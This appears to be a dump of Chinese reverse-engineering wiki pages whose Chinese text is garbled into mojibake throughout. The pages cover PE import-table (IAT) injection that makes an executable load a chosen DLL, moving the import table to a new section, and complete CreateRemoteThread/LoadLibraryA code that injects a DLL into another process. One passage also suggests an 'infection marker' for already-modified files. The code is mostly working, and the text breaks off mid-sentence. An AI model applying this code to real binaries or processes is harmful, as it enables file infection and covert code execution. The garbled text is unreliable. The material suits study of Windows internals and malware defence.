//ç§»åŠ¨å¯¼å‡ºè¡¨åˆ°æ–°èŠ‚ if (!PEFile.IATInjection(lpNewBuffer)) &#123; return 1; &#125; printf(&quot;[+] IATInjection successfully. &quot;); //å­˜ç›˜ if (!PEFile.SaveUnstretchedPEToDisk(lpNewBuffer, &quot;IATInjection&quot;)) &#123; return 1; &#125; printf(&quot;[+] SaveUnstretchedPEToDisk successfully. &quot;); return 0;&#125; è·å–ç›¸å…³PEæŒ‡é’ˆï¼Œå’Œå¯¼å…¥è¡¨æŒ‡é’ˆ 123456789101112131415//è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆauto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer);auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer);auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer);if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer)&#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE;&#125;// è·å–å¯¼å…¥è¡¨æŒ‡é’ˆauto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer);if (!pImportDirectory)&#123; return FALSE;&#125; æŒ‡å‘æ–°èŠ‚èµ·å§‹ä½ç½®ï¼Œå‡†å¤‡ç§»åŠ¨æ•°æ® 123// æ–°èŠ‚çš„èµ·å§‹ä½ç½®PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1);DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; dwDstOffsetè¿™ä¸ªå€¼æ˜¯æ–°èŠ‚.PointerToRawDataï¼Œåœ¨åé¢æ‹·è´å®ŒæŸå—æ•°æ®åä¼šè¿›è¡Œæ›´æ–°ã€‚ dwDstOffsetè¿™ä¸ªå€¼æ˜¯FOAï¼ˆç›¸å¯¹äºæ–‡ä»¶å¤´çš„åç§»ï¼‰ï¼Œå› ä¸ºæˆ‘ä»¬éƒ½æ˜¯åœ¨æœªæ‹‰ä¼¸çš„Bufferä¸Šæ“ä½œã€‚è€Œå¯¼å…¥è¡¨ä¸­å­˜çš„å­—æ®µéƒ½æ˜¯RVAåœ°å€ï¼Œæ‰€ä»¥è¦ç”¨åˆ°FOAToRVA ç§»åŠ¨å¯¼å…¥è¡¨åˆ°æ–°ä½ç½® è¿™é‡Œç›´æ¥å·æ‡’ç”¨æ•°æ®ç›®å½•è¡¨ä¸­æè¿°çš„å¯¼å…¥è¡¨Sizeå¤§å°/å•ä¸ªå¯¼å…¥è¡¨å¤§å°å¾—åˆ°å¯¼å…¥è¡¨ä¸ªæ•°ï¼Œè¿™ä¸ªä¸ªæ•°åŒ…æ‹¬ç»“å°¾ç”¨äºç»“æŸæ ‡å¿—çš„ç©ºå¯¼å…¥è¡¨ã€‚ä½†å®é™…ä¸Šï¼Œç”¨Lord PEæ·»åŠ å¯¼å…¥è¡¨åï¼Œæ•°æ®ç›®å½•è¡¨ä¸­çš„è¿™ä¸ªSizeå¤§å°æ²¡æœ‰å¢åŠ ã€‚ä¹Ÿå°±æ˜¯è¯´ï¼Œè¿™ä¸ªSizeå¯èƒ½ä¸å‡†ã€‚ä¸¥è°¨ä¸€ç‚¹çš„åšæ³•ï¼Œå°±è¦é€šè¿‡éå†å¯¼å…¥è¡¨æ¥å¾—çŸ¥æœ‰å‡ å¼ å¯¼å…¥è¡¨ã€‚ 1234567891011121314//1ã€ç§»åŠ¨å¯¼å…¥è¡¨åˆ°æ–°ä½ç½®DWORD dwOldIIDSize = pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size;memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, pImportDirectory, dwOldIIDSize); DWORD dwNewImportTableFOA = dwDstOffset; //è®°å½•å¯¼å…¥è¡¨æ–°ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­å¯¼å…¥è¡¨æè¿°çš„VirtualAddresså­—æ®µDWORD dwNewImportTableRVA = 0;if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer))&#123; return FALSE;&#125;dwDstOffset += dwOldIIDSize;pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; //æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„å¯¼å…¥è¡¨åœ°å€æŒ‡å‘å’ŒSizepOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size += 20; //ä¸åŠ ä¹Ÿå¯ä»¥çš„ æ–°å¢ä¸€å¼ å¯¼å…¥è¡¨ 12345678//2ã€æ–°å¢ä¸€å¼ å¯¼å…¥è¡¨BYTE OldIIDCount = dwOldIIDSize / sizeof(IMAGE_IMPORT_DESCRIPTOR) - 1; //SizeåŒ…å«äº†ç»“å°¾çš„ç©ºç»“æ„ä½“ï¼Œ-1å‡æ‰å°±æ˜¯å®é™…ä¸Šæœ‰å¤šå°‘ä¸ªIIDç»“æ„ä½“ auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA);auto pMyImportDirectory = pNewImportDirectory + OldIIDCount; //æŒ‡å‘æ–°å¢çš„å¯¼å…¥è¡¨memset(pMyImportDirectory, 0, sizeof(IMAGE_IMPORT_DESCRIPTOR)); //å…¶å®æ–°å¢çš„å¯¼å…¥è¡¨æ‰€æœ‰å­—æ®µå·²ä¸º0ï¼Œå› ä¸ºä¹‹å‰æ–°å¢èŠ‚æ—¶å…¨å¡«å……ä¸º0 //TimeDateStampå’ŒForwarderChainå·²ä¸º0dwDstOffset += sizeof(IMAGE_IMPORT_DESCRIPTOR); // æ–°å¢èŠ‚æœ¬èº«å…¨ä¸º0ï¼Œè®©dwDstOffsetå‰è¿›ä¸€å¼ å¯¼å…¥è¡¨çš„å¤§å°ï¼ˆ20å­—èŠ‚ï¼‰printf(&quot;[+] Imported table successfully copied and new import descriptor initialized. &quot;); æ„é€ æç¤ºåè¡¨ 123456789101112131415161718//ï¼ˆ1ï¼‰æç¤ºåè¡¨DWORD dwMyHintNameTableFOA = dwDstOffset; //è®°å½•è‡ªå·±æ„é€ çš„æç¤ºåè¡¨çš„ä½ç½®ï¼Œç”¨äºåé¢è®©INTå’ŒIATè¡¨æŒ‡å‘è¿™ä¸ªå€¼DWORD dwMyHintNameTableRVA = 0;if (!FOAToRVA(dwMyHintNameTableFOA, dwMyHintNameTableRVA, lpNewBuffer))&#123; return FALSE;&#125; WORD MyHint = 0; //æ„é€ æç¤ºåè¡¨char MyName[] = &quot;ExportFunction&quot;;BYTE MyNameLength = strlen(MyName) + 1; //MyHint = 0 //ç§»åŠ¨dwDstOffset += sizeof(MyHint);memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, MyName, MyNameLength);dwDstOffset += MyNameLength; DWORD dwThunkDataValue = dwMyHintNameTableRVA; //æ›´æ–°INTè¡¨å’ŒIATè¡¨è¡¨é¡¹ æ„é€ INTè¡¨å’ŒIATè¡¨ INTè¡¨IATè¡¨123456789101112//ï¼ˆ2ï¼‰INTè¡¨DWORD dwMyINTTableFOA = dwDstOffset; //è®°å½•è‡ªå·±æ„é€ çš„INTè¡¨çš„ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å…¥è¡¨çš„OriginalFirstThunkå­—æ®µDWORD dwMyINTTableRVA = 0;if (!FOAToRVA(dwMyINTTableFOA, dwMyINTTableRVA, lpNewBuffer))&#123; return FALSE;&#125; memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, &amp;dwThunkDataValue, sizeof(dwThunkDataValue));dwDstOffset += sizeof(dwThunkDataValue) * 2; //æ›´æ–°dwDstOffsetï¼Œå†è·³ä¸€ä¸ªå¤§å°ä½œä¸ºINTè¡¨ç»“å°¾ pMyImportDirectory-&gt;OriginalFirstThunk = dwMyINTTableRVA; //æ›´æ–°æ–°å¢å¯¼å…¥è¡¨çš„OriginalFirstThunkå­—æ®µ123456789101112//ï¼ˆ3ï¼‰IATè¡¨DWORD dwMyIATTableFOA = dwDstOffset; //è®°å½•è‡ªå·±æ„é€ çš„IATè¡¨çš„ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å…¥è¡¨çš„FirstThunkå­—æ®µDWORD dwMyIATTableRVA = 0;if (!FOAToRVA(dwMyIATTableFOA, dwMyIATTableRVA, lpNewBuffer))&#123; return FALSE;&#125; memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, &amp;dwThunkDataValue, sizeof(dwThunkDataValue));dwDstOffset += sizeof(dwThunkDataValue) * 2; //æ›´æ–°dwDstOffsetï¼Œå†è·³ä¸€ä¸ªå¤§å°ä½œä¸ºIATè¡¨ç»“å°¾ pMyImportDirectory-&gt;FirstThunk = dwMyIATTableRVA; //æ›´æ–°æ–°å¢å¯¼å…¥è¡¨çš„FirstThunkå­—æ®µ æ„é€ Dllå 123456789101112131415//ï¼ˆ4ï¼‰Dll å//è®°å½•ä½ç½®DWORD dwMyDllNameFOA = dwDstOffset; //è®°å½•è‡ªå·±æ„é€ çš„Dllåçš„ä½ç½®ï¼Œç”¨äºåé¢æ›´æ–°å¯¼å…¥è¡¨çš„Nameå­—æ®µDWORD dwMyDllNameRVA = 0;if (!FOAToRVA(dwMyDllNameFOA, dwMyDllNameRVA, lpNewBuffer))&#123; return FALSE;&#125; char MyDllName[] = &quot;IATInjection_Dll.dll&quot;;BYTE MyDllNameLength = strlen(MyDllName) + 1;memcpy((PBYTE)(DWORD)lpNewBuffer + dwDstOffset, MyDllName, MyDllNameLength);//dwDstOffset += MyDllNameLength; //æ›´æ–°dwDstOffset pMyImportDirectory-&gt;Name = dwMyDllNameRVA; //æ›´æ–°æ–°å¢å¯¼å…¥è¡¨çš„Nameå­—æ®µ å®Œæ•´ä»£ç 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146BOOL PEManipulator::MoveImportTableToNewSection(LPVOID lpNewBuffer)&#123; //è·å–NewBufferä¸­ç›¸å…³çš„PEæŒ‡é’ˆ auto pPeHdr_NewBuffer = GetPeHeader(lpNewBuffer); auto pOptionalPeHdr_NewBuffer = GetOptionPeHeaders(lpNewBuffer); auto pSecHdr_NewBuffer = GetSectionHeader(lpNewBuffer); if (!pPeHdr_NewBuffer || !pOptionalPeHdr_NewBuffer || !pSecHdr_NewBuffer) &#123; printf(&quot; [!] One or more PE Header pointers are invalid &quot;); return FALSE; &#125; // è·å–å¯¼å…¥è¡¨æŒ‡é’ˆ auto pImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)GetDataDirectoryPointer(IMAGE_DIRECTORY_ENTRY_IMPORT, lpNewBuffer); if (!pImportDirectory) &#123; return FALSE; &#125; // æ–°èŠ‚çš„èµ·å§‹ä½ç½® PIMAGE_SECTION_HEADER pNewSection = pSecHdr_NewBuffer + (pPeHdr_NewBuffer-&gt;NumberOfSections - 1); DWORD dwDstOffset = pNewSection-&gt;PointerToRawData; //1ã€ç»Ÿè®¡å¯¼å…¥è¡¨ä¸ªæ•°ï¼Œéšåå°†å¯¼å…¥è¡¨ç§»åŠ¨åˆ°æ–°ä½ç½® BYTE ImportTableCount = 0; while (pImportDirectory[ImportTableCount].OriginalFirstThunk &amp;&amp; pImportDirectory[ImportTableCount].FirstThunk) &#123; ++ImportTableCount; &#125; DWORD ImportTableSize = (ImportTableCount + 1) * sizeof(IMAGE_IMPORT_DESCRIPTOR); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pImportDirectory, ImportTableSize); DWORD dwNewImportTableFOA = dwDstOffset; DWORD dwNewImportTableRVA = 0; if (!FOAToRVA(dwNewImportTableFOA, dwNewImportTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += ImportTableSize; //æ›´æ–°dwDstOffset //2ã€æŒ‡å‘æ–°æ–°å¯¼å…¥è¡¨ï¼Œéå†å®ƒï¼Œå°†æ‰€æœ‰INTè¡¨æ‹·åˆ°æ–°ä½ç½® auto pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); BYTE count = 0; while (pINTTable[count]) &#123; ++count; &#125; DWORD dwINTTableSize = (count + 1) * sizeof(DWORD); // +1 for null terminator memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), pINTTable, dwINTTableSize); DWORD dwNewINTTableFOA = dwDstOffset; DWORD dwNewINTTableRVA = 0; if (!FOAToRVA(dwNewINTTableFOA, dwNewINTTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += dwINTTableSize; //æ›´æ–°dwDstOffset //ä¿®æ­£å¯¼å…¥è¡¨ä¸­OriginalFirstThunkæŒ‡å‘ pNewImportDirectory-&gt;OriginalFirstThunk = dwNewINTTableRVA; ++pNewImportDirectory; //ä¸‹ä¸€å¼ å¯¼å…¥è¡¨ &#125; //3ã€éå†æ–°å¯¼å…¥è¡¨ï¼Œéå†INTè¡¨ï¼Œå¤„ç†æç¤ºåè¡¨ + å¤„ç†å¯¼å…¥è¡¨çš„Nameå­—æ®µ pNewImportDirectory = (PIMAGE_IMPORT_DESCRIPTOR)((DWORD)lpNewBuffer + dwNewImportTableFOA); //å›åˆ°ç¬¬ä¸€å¼ å¯¼å…¥è¡¨ while (pNewImportDirectory-&gt;OriginalFirstThunk &amp;&amp; pNewImportDirectory-&gt;FirstThunk) &#123; DWORD dwOriginalFirstThunk_FOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;OriginalFirstThunk, dwOriginalFirstThunk_FOA, lpNewBuffer)) &#123; return FALSE; &#125; auto pINTTable = (PDWORD)((DWORD)lpNewBuffer + dwOriginalFirstThunk_FOA); while (*pINTTable) &#123; if (IMAGE_SNAP_BY_ORDINAL(*pINTTable)) //æœ€é«˜ä½ä¸º1ï¼Œåºå·æ–¹å¼è¾“å…¥ &#123; ; &#125; else //æœ€é«˜ä½ä¸º0ï¼ŒæŒ‡å‘Hint-Name Table &#123; DWORD dwHintNameTableFOA = 0; if (!RVAToFOA(*pINTTable, dwHintNameTableFOA)) &#123; return FALSE; &#125; auto pHintNameTable = (PIMAGE_IMPORT_BY_NAME)((DWORD)lpNewBuffer + dwHintNameTableFOA); BYTE SizeOfHintNameTableItem = sizeof(pHintNameTable-&gt;Hint) + (strlen((PCHAR)pHintNameTable-&gt;Name) + 1); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), (PBYTE)pHintNameTable, SizeOfHintNameTableItem); DWORD dwNewHintNameTableFOA = dwDstOffset; DWORD dwNewHintNameTableRVA = 0; if (!FOAToRVA(dwNewHintNameTableFOA, dwNewHintNameTableRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += SizeOfHintNameTableItem; //ä¿®æ­£INTè¡¨é¡¹çš„æŒ‡å‘ *pINTTable = dwNewHintNameTableRVA; &#125; ++pINTTable; //INTè¡¨ä¸‹ä¸€é¡¹ &#125; //å¤„ç†å¯¼å…¥è¡¨çš„Nameå­—æ®µ DWORD dwNameFOA = 0; if (!RVAToFOA(pNewImportDirectory-&gt;Name, dwNameFOA)) &#123; return FALSE; &#125; auto cName = (PCHAR)((DWORD)lpNewBuffer + dwNameFOA); memcpy((PBYTE)((DWORD)lpNewBuffer + dwDstOffset), cName, strlen(cName) + 1); DWORD dwNewNameFOA = dwDstOffset; DWORD dwNewNameRVA = 0; if (!FOAToRVA(dwNewNameFOA, dwNewNameRVA, lpNewBuffer)) &#123; return FALSE; &#125; dwDstOffset += strlen(cName) + 1; //æ›´æ–°dwDstOffset pNewImportDirectory-&gt;Name = dwNewNameRVA; //ä¿®æ­£å¯¼å…¥è¡¨ä¸­Nameå­—æ®µæŒ‡å‘ //ä¸‹ä¸€å¼ å¯¼å…¥è¡¨ ++pNewImportDirectory; &#125; //4ã€æ›´æ–°æ•°æ®ç›®å½•è¡¨ä¸­çš„å¯¼å…¥è¡¨åœ°å€æŒ‡å‘ pOptionalPeHdr_NewBuffer-&gt;DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress = dwNewImportTableRVA; printf(&quot;[+] Import table successfully moved and fixed. &quot;); return TRUE;&#125; è¿è¡Œç»“æœ ç”¨Lord PEå·¥å…·æ–°å¢èŠ‚ä»£ç è¿è¡Œæ•ˆæœç”¨Lord PEæ–°å¢å¯¼å…¥è¡¨çš„åŠŸèƒ½æ¥è¯•ä¸‹IATæ³¨å…¥ã€‚ å¦‚æœå‹¾é€‰äº†Check imports for existenctã€‚Lord PEè¦å»æŸ¥æ‰¾å†™çš„APIå‡½æ•°æ˜¯å¦åœ¨è¿™ä¸ªdllä¸­ï¼Œå®ƒä¼šç”¨LoadLibraryåŠ è½½è¿™ä¸ªdllã€‚åœ¨æˆ‘ä»¬è¿™ä¸ªä¾‹å­ä¸­ï¼Œç‚¹å‡»â€œ+â€åå°±ä¼šçœ‹åˆ°Inité‚£ä¸ªMessageboxçš„å¼¹çª— åªæœ‰å½“Lord PEè¿™ä¸ªè¿›ç¨‹å…³é—­åï¼Œåˆšæ‰åŠ è½½çš„dllæ‰ä¼šé‡Šæ”¾ï¼Œæ‰ä¼šçœ‹åˆ°Destoryé‚£ä¸ªMessageboxçš„å¼¹çª—ã€‚ Lord PEæ˜¯åœ¨åŸexeçš„åŸºç¡€ä¸Šç›´æ¥ä¿®æ”¹ã€‚è¿è¡Œä¿®æ”¹åçš„exeï¼Œè§‚å¯Ÿåˆ°Initå¼¹çª—ï¼Œé€€å‡ºfgåï¼Œçœ‹åˆ°Destoryå¼¹çª—ã€‚ è¿è¡Œexeå‰è¦æŠŠdllæ”¾åˆ°åŒä¸€ç›®å½•ä¸‹ï¼Œå› ä¸ºåŠ è½½dllçš„æŸ¥æ‰¾é¡ºåºåŸå›  è¿è¡Œexeå‰è¦æŠŠdllæ”¾åˆ°åŒä¸€ç›®å½•ä¸‹ï¼Œå› ä¸ºåŠ è½½dllçš„æŸ¥æ‰¾é¡ºåºåŸå›  é€€å‡ºfgï¼Œèƒ½çœ‹åˆ°Destoryçš„çª—å£ æœªæ¥å¯ç»§ç»­å®Œå–„ä¼˜åŒ–çš„ æ„ŸæŸ“æ ‡è®°ï¼Œå¦‚æœè¿™ä¸ªPEæ–‡ä»¶å·²ç»IATè¡¨æ³¨å…¥è¿‡ï¼Œç¨‹åºé€€å‡ºã€‚å¦‚ï¼Œåœ¨DOSå¤´ä¸­éšä¾¿æ‰¾ä¸ªæ²¡å•¥ç”¨çš„å­—æ®µï¼Œå°†å®ƒçš„å€¼ä¿®æ”¹ï¼Œä½œä¸ºæ„ŸæŸ“æ ‡è®°ã€‚ åœ¨ç©ºç™½åŒºæŸ¥æ‰¾æŒ‡å®šå¤§å°ï¼Œç¬¦åˆèŠ‚å±æ€§çš„å‡½æ•°ã€‚è°ƒç”¨æŸ¥æ‰¾å‡½æ•°ï¼Œå®åœ¨æ²¡ä½ç½®ï¼Œç”¨æ‰©å¤§èŠ‚æˆ–æ–°å¢èŠ‚æ¥è§£å†³ã€‚"},{"title":"ç›®å½•","path":"/wiki/Hook/ç›®å½•.html","content":"å…·ä½“çš„HookæŠ€æœ¯æœ‰å¾ˆå¤šï¼Œä½†ä»å¤§ä½“ä¸Šåˆ†ä¸ºä¸¤ç±»ï¼š æ”¹å‡½æ•°åœ°å€ï¼ŒAddress Hook æ”¹å‡½æ•°å†…éƒ¨çš„ä»£ç ï¼ŒInline Hook ç›®å½• æ–‡ç« å ç±»å‹ å¤‡æ³¨ IAT Hook"},{"title":"DLLæ³¨å…¥","path":"/wiki/Injection/DLLæ³¨å…¥.html","content":"DLLæ³¨å…¥ æƒ³æŸä¸ªè¿›ç¨‹æ³¨å…¥DLLä¸»è¦æœ‰ä¸‰ç§æ–¹æ³•å®ç°ï¼š åˆ›å»ºè¿œç¨‹çº¿ç¨‹ï¼ˆCreateRemoteThreadï¼‰ æ³¨å†Œè¡¨ï¼ˆAppInit_DLLSå€¼ï¼‰ æ¶ˆæ¯é’©å–ï¼ˆSetWindowHookEx()ï¼‰ æœ¬æ–‡è®²è§£ç”¨è¿œç¨‹çº¿ç¨‹æ¥å®ç°DLLæ³¨å…¥ã€‚ è¿œç¨‹çº¿ç¨‹æ³¨å…¥DLLåŸç† é€šè¿‡CreateRemoteThreadåœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ç”¨äºæ‰§è¡Œä»£ç ã€‚ 123456789HANDLE CreateRemoteThread( [in] HANDLE hProcess, // handle to process ç›®æ ‡è¿›ç¨‹å¥æŸ„ [in] LPSECURITY_ATTRIBUTES lpThreadAttributes,// SD [in] SIZE_T dwStackSize, // initial stack size [in] LPTHREAD_START_ROUTINE lpStartAddress, // thread function çº¿ç¨‹å‡½æ•°åœ°å€ï¼Œè¿™ä¸ªåœ°å€æ˜¯ç›®æ ‡è¿›ç¨‹ä¸­çš„åœ°å€ [in] LPVOID lpParameter, // thread argument [in] DWORD dwCreationFlags, // creation option [out] LPDWORD lpThreadId // thread identifier); ä¸€äº›ç»†èŠ‚é—®é¢˜ åˆ›å»ºçš„çº¿ç¨‹æ˜¯åœ¨ç›®æ ‡è¿›ç¨‹ä¸­ï¼Œæ‰§è¡Œçš„ä»£ç ä»å“ªæ¥ï¼Ÿ å¯ä»¥æ˜¯å†™åˆ°ç›®æ ‡è¿›ç¨‹ä¸­çš„shellcode åœ¨æœ¬æ–‡ä¸­æ¼”ç¤ºçš„è¿œç¨‹çº¿ç¨‹æ³¨å…¥æ˜¯è¿™æ ·çš„ï¼šä¸ºç›®æ ‡è¿›ç¨‹åˆ›å»ºè¿œç¨‹çº¿ç¨‹æ‰§è¡ŒLoadLibraryAï¼Œè®©ç›®æ ‡è¿›ç¨‹åŠ è½½æˆ‘ä»¬å†™çš„æ¶æ„dllï¼Œåœ¨DllMainä¸­è®¾å®šè¯¥dllè¢«åŠ è½½æ—¶è¦æ‰§è¡Œçš„ä»£ç ï¼Œä»è€Œè¾¾åˆ°å¯¹ç›®æ ‡è¿›ç¨‹æ³¨å…¥çš„æ•ˆæœ ä»£ç å®ç° InjectedDLLTargetProcessRemoteThreadCreatorè¡¨ç¤ºè¢«æ³¨å…¥çš„dllã€‚å½“æœ‰è¿›ç¨‹åŠ è½½è¯¥dllæ—¶åˆ›å»ºä¸€ä¸ªçº¿ç¨‹åšä¸€äº›äº‹ 123456789101112131415161718192021222324#include &lt;windows.h&gt;#include &lt;stdio.h&gt;DWORD WINAPI ThreadFunc(LPVOID lpParam)&#123; printf(&quot;Thread function in DLL called... &quot;); return 0;&#125;BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)&#123; switch (ul_reason_for_call) &#123; case DLL_PROCESS_ATTACH: // åˆ›å»ºä¸€ä¸ªçº¿ç¨‹ï¼Œå½“DLLè¢«åŠ è½½æ—¶æ‰§è¡Œ CreateThread(NULL, 0, ThreadFunc, NULL, 0, NULL); break; case DLL_THREAD_ATTACH: case DLL_THREAD_DETACH: case DLL_PROCESS_DETACH: break; &#125; return TRUE;&#125;æ‰“å°è‡ªèº«è¿›ç¨‹IDï¼Œç­‰å¾…è¢«æ³¨å…¥ 1234567891011121314#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // æ‰“å°å½“å‰è¿›ç¨‹çš„ID DWORD processId = GetCurrentProcessId(); printf(&quot;Target Process ID: %lu &quot;, processId); // ç­‰å¾…ç”¨æˆ·è¾“å…¥ getchar(); return 0;&#125; æ¥æ”¶ç”¨æˆ·è¾“å…¥çš„ç›®æ ‡è¿›ç¨‹IDï¼Œä½¿ç”¨OpenProcessè·å¾—ç›®æ ‡è¿›ç¨‹å¥æŸ„ è®¡ç®—dllåç§°é•¿åº¦ï¼Œä½¿ç”¨VirtualAllocExåœ¨ç›®æ ‡è¿›ç¨‹åˆ†é…å†…å­˜ç©ºé—´ ä½¿ç”¨WriteProcessMemoryå°†dllåå†™åˆ°ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ç©ºé—´ä¸­ ä½¿ç”¨GetModuleHandleå’ŒGetProcAddressè·å–LoadLibraryAå‡½æ•°åœ°å€ï¼ˆå› ä¸ºåœ¨åŒä¸€æ“ä½œç³»ç»Ÿä¸­ï¼Œæ¯ä¸ªè¿›ç¨‹ä¸­ç³»ç»ŸAPIçš„å‡½æ•°åœ°å€æ˜¯ä¸€æ ·çš„ã€‚æˆ‘ä»¬åœ¨RemoteThreadCreatorè¿›ç¨‹ä¸­è·å¾—çš„ç³»ç»Ÿapiåœ°å€ï¼ŒåŒæ ·ä¹Ÿé€‚ç”¨äºç›®æ ‡è¿›ç¨‹ï¼‰ ä½¿ç”¨CreateRemoteThreadåˆ›å»ºè¿œçº¿ç¨‹ï¼Œçº¿ç¨‹å‡½æ•°åœ°å€ä¼ LoadLibraryAå‡½æ•°åœ°å€ï¼Œå‚æ•°ä¼ dllåç§° ç­‰å¾…æ‰§è¡Œå®Œæ¯•ï¼Œé‡Šæ”¾ç›¸å…³èµ„æº 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#include &lt;windows.h&gt;#include &lt;stdio.h&gt;int main()&#123; // è¾“å…¥ç›®æ ‡è¿›ç¨‹çš„ID DWORD dwTargetProcessId; printf(&quot;Enter the target process ID: &quot;); scanf(&quot;%lu&quot;, &amp;dwTargetProcessId); // æ‰“å¼€ç›®æ ‡è¿›ç¨‹ HANDLE hProcess = OpenProcess( PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwTargetProcessId); if (hProcess == NULL) &#123; printf(&quot;Failed to open target process. Error: %lu &quot;, GetLastError()); return 1; &#125; printf(&quot;Target process opened successfully. &quot;); // DLL åç§° const char* dllName = &quot;InjectedDLL.dll&quot;; size_t dllNameLength = strlen(dllName) + 1; // åœ¨ç›®æ ‡è¿›ç¨‹ä¸­åˆ†é…å†…å­˜ LPVOID pRemoteMemory = VirtualAllocEx(hProcess, NULL, dllNameLength, MEM_COMMIT, PAGE_READWRITE); if (pRemoteMemory == NULL) &#123; printf(&quot;Failed to allocate memory in target process. Error: %lu &quot;, GetLastError()); CloseHandle(hProcess); return 1; &#125; // å°†DLLåç§°å†™å…¥ç›®æ ‡è¿›ç¨‹çš„å†…å­˜ if (!WriteProcessMemory(hProcess, pRemoteMemory, dllName, dllNameLength, NULL)) &#123; printf(&quot;Failed to write memory in target process. Error: %lu &quot;, GetLastError()); VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE); CloseHandle(hProcess); return 1; &#125; // è·å–LoadLibraryAå‡½æ•°åœ°å€ HMODULE hKernel32 = GetModuleHandle(&quot;Kernel32&quot;); FARPROC pLoadLibraryA = GetProcAddress(hKernel32, &quot;LoadLibraryA&quot;); if (pLoadLibraryA == NULL) &#123; printf(&quot;Failed to get LoadLibraryA address. Error: %lu &quot;, GetLastError()); VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE); CloseHandle(hProcess); return 1; &#125; // åˆ›å»ºè¿œç¨‹çº¿ç¨‹ HANDLE hRemoteThread = CreateRemoteThread( hProcess, NULL, // é»˜è®¤å®‰å…¨å±æ€§ 0, // é»˜è®¤å †æ ˆå¤§å° (LPTHREAD_START_ROUTINE)pLoadLibraryA, // çº¿ç¨‹å‡½æ•°åœ°å€ pRemoteMemory, // ä¼ é€’ç»™çº¿ç¨‹å‡½æ•°çš„å‚æ•° 0, // é»˜è®¤åˆ›å»ºæ ‡å¿— NULL ); // ä¸éœ€è¦æ¥æ”¶çº¿ç¨‹ID if (hRemoteThread == NULL) &#123; printf(&quot;Failed to create remote thread. Error: %lu &quot;, GetLastError()); &#125; else &#123; printf(&quot;Remote thread created successfully. &quot;); &#125; // ç­‰å¾…è¿œç¨‹çº¿ç¨‹æ‰§è¡Œå®Œæ¯• WaitForSingleObject(hRemoteThread, INFINITE); // é‡Šæ”¾åˆ†é…çš„å†…å­˜ VirtualFreeEx(hProcess, pRemoteMemory, 0, MEM_RELEASE); // å…³é—­å¥æŸ„ CloseHandle(hRemoteThread); CloseHandle(hProcess); return 0;&#125; è¿è¡Œæµ‹è¯• ä¸Šé¢ä»£ç ä¸­å¾€ç›®æ 